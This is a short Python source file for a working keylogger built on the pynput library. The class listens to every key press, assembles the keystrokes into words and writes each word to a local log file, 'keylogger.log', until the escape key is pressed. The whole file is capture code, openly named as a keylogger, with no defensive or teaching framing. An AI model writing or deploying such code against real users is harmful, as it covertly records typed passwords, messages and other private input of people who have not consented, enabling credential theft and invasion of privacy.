from pynput.keyboard import *
import os
import logging

log_file = None
stack_words = ""
class KEYLOGGER(object):
    def __init__(self):
       global log_file
       log_file = 'keylogger.log'
       logging.basicConfig(filename=log_file,level=logging.DEBUG, format='Word:  "%(message)s"')
       
    def on_press(self,key):
        global stack_words
        try:
            if key == Key.space or key == Key.enter or key == Key.backspace:
                logging.debug(stack_words.replace("'",''))
                stack_words = ""
            else:
                stack_words+= str(key)
        except AttributeError:
            logging.error(key)
    
    def on_release(self,key):
        if key == Key.esc:
            return False
    
    def start_keylogger(self):
        with Listener(on_press=self.on_press,on_release=self.on_release)as listener:
            listener.join()